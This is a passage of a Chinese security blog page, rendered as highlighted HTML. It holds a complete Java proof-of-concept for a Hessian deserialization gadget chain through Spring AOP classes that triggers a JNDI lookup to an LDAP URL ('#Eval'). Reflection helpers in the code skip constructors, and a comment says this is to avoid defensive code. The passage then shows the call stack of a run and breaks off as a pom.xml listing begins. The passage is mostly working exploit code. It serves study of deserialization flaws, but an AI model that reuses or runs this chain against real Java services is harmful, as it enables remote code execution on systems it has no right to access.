+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>sun.reflect.ReflectionFactory</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayInputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>springConetextAopExp</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>url</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ldap://127.0.0.1:1389/#Eval&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SimpleJndiBeanFactory</span><span class=w> </span><span class=n>simpleJndiBeanFactory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>SimpleJndiBeanFactory</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AspectInstanceFactory</span><span class=w> </span><span class=n>beanFactoryAspectInstanceFactory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>createWithoutConstructor</span><span class=p>(</span><span class=n>BeanFactoryAspectInstanceFactory</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>beanFactoryAspectInstanceFactory</span><span class=p>,</span><span class=w> </span><span class=s>&#34;beanFactory&#34;</span><span class=p>,</span><span class=w> </span><span class=n>simpleJndiBeanFactory</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>beanFactoryAspectInstanceFactory</span><span class=p>,</span><span class=w> </span><span class=s>&#34;name&#34;</span><span class=p>,</span><span class=w> </span><span class=n>url</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AbstractAspectJAdvice</span><span class=w> </span><span class=n>aspectJAroundAdvice</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>createWithoutConstructor</span><span class=p>(</span><span class=n>AspectJAroundAdvice</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>aspectJAroundAdvice</span><span class=p>,</span><span class=w> </span><span class=s>&#34;aspectInstanceFactory&#34;</span><span class=p>,</span><span class=w> </span><span class=n>beanFactoryAspectInstanceFactory</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>AspectJPointcutAdvisor</span><span class=w> </span><span class=n>aspectJPointcutAdvisor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>createWithoutConstructor</span><span class=p>(</span><span class=n>AspectJPointcutAdvisor</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>aspectJPointcutAdvisor</span><span class=p>,</span><span class=w> </span><span class=s>&#34;advice&#34;</span><span class=p>,</span><span class=w> </span><span class=n>aspectJAroundAdvice</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>PartiallyComparableAdvisorHolder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>aClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>PartiallyComparableAdvisorHolder</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>partially</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>createWithoutConstructor</span><span class=p>(</span><span class=n>aClass</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>partially</span><span class=p>,</span><span class=w> </span><span class=s>&#34;advisor&#34;</span><span class=p>,</span><span class=w> </span><span class=n>aspectJPointcutAdvisor</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HotSwappableTargetSource</span><span class=w> </span><span class=n>targetSource1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HotSwappableTargetSource</span><span class=p>(</span><span class=n>partially</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HotSwappableTargetSource</span><span class=w> </span><span class=n>targetSource2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HotSwappableTargetSource</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>XString</span><span class=p>(</span><span class=s>&#34;aaa&#34;</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>hashMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>targetSource1</span><span class=p>,</span><span class=w> </span><span class=s>&#34;aaa&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>targetSource2</span><span class=p>,</span><span class=w> </span><span class=s>&#34;bbb&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=n>serialize</span><span class=p>(</span><span class=n>hashMap</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unserialize</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2Output</span><span class=w> </span><span class=n>hessian2Output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hessian2Output</span><span class=p>(</span><span class=n>baos</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>getSerializerFactory</span><span class=p>().</span><span class=na>setAllowNonSerializable</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>unserialize</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>bais</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2Input</span><span class=w> </span><span class=n>hessianInput</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hessian2Input</span><span class=p>(</span><span class=n>bais</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>hessianInput</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// 创建实例但是不触发构造方法（避免有防御代码）</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>T</span><span class=w> </span><span class=nf>createWithoutConstructor</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>clazz</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>createWithConstructor</span><span class=p>(</span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>T</span><span class=w> </span><span class=nf>createWithConstructor</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>targetClass</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                              </span><span class=n>Class</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>constructorClass</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                              </span><span class=n>Class</span><span class=o>&lt;?&gt;[]</span><span class=w> </span><span class=n>argTypes</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                              </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>templateCons</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>constructorClass</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>argTypes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>templateCons</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>fakeCons</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ReflectionFactory</span><span class=p>.</span><span class=na>getReflectionFactory</span><span class=p>().</span><span class=na>newConstructorForSerialization</span><span class=p>(</span><span class=n>targetClass</span><span class=p>,</span><span class=w> </span><span class=n>templateCons</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>fakeCons</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>T</span><span class=p>)</span><span class=w> </span><span class=n>fakeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>args</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getField</span><span class=p>(</span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>(),</span><span class=n>field</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Field</span><span class=w> </span><span class=nf>getField</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>fieldName</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>clazz</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>fieldName</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>field</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=n>field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NoSuchFieldException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>clazz</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>()</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=n>getField</span><span class=p>(</span><span class=n>clazz</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>(),</span><span class=w> </span><span class=n>fieldName</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NoSuchFieldException</span><span class=p>(</span><span class=n>fieldName</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>调用栈</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>JndiTemplate</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>JndiTemplate</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>156</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>JndiTemplate</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>JndiTemplate</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>178</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>JndiLocatorSupport</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>JndiLocatorSupport</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>96</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>SimpleJndiBeanFactory</span><span class=p>.</span><span class=na>doGetType</span><span class=p>(</span><span class=n>SimpleJndiBeanFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>236</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>SimpleJndiBeanFactory</span><span class=p>.</span><span class=na>getType</span><span class=p>(</span><span class=n>SimpleJndiBeanFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>193</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>aspectj</span><span class=p>.</span><span class=na>annotation</span><span class=p>.</span><span class=na>BeanFactoryAspectInstanceFactory</span><span class=p>.</span><span class=na>getOrder</span><span class=p>(</span><span class=n>BeanFactoryAspectInstanceFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>136</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>aspectj</span><span class=p>.</span><span class=na>AbstractAspectJAdvice</span><span class=p>.</span><span class=na>getOrder</span><span class=p>(</span><span class=n>AbstractAspectJAdvice</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>223</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>aspectj</span><span class=p>.</span><span class=na>AspectJPointcutAdvisor</span><span class=p>.</span><span class=na>getOrder</span><span class=p>(</span><span class=n>AspectJPointcutAdvisor</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>81</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>aspectj</span><span class=p>.</span><span class=na>autoproxy</span><span class=p>.</span><span class=na>AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder</span><span class=p>.</span><span class=na>toString</span><span class=p>(</span><span class=n>AspectJAwareAdvisorAutoProxyCreator</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>151</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>sun</span><span class=p>.</span><span class=na>org</span><span class=p>.</span><span class=na>apache</span><span class=p>.</span><span class=na>xpath</span><span class=p>.</span><span class=na>internal</span><span class=p>.</span><span class=na>objects</span><span class=p>.</span><span class=na>XString</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>XString</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>392</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>target</span><span class=p>.</span><span class=na>HotSwappableTargetSource</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>HotSwappableTargetSource</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>104</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashMap</span><span class=p>.</span><span class=na>putVal</span><span class=p>(</span><span class=n>HashMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>634</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>HashMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>611</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>MapDeserializer</span><span class=p>.</span><span class=na>readMap</span><span class=p>(</span><span class=n>MapDeserializer</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>114</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>SerializerFactory</span><span class=p>.</span><span class=na>readMap</span><span class=p>(</span><span class=n>SerializerFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>577</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2093</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>gadget</span><span class=p>.</span><span class=na>springConetextAopExp</span><span class=p>.</span><span class=na>unserialize</span><span class=p>(</span><span class=n>springConetextAopExp</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>66</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>gadget</span><span class=p>.</span><span class=na>springConetextAopExp</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>springConetextAopExp</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>51</span><span class=p>)</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>完整的 pom.xml 如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
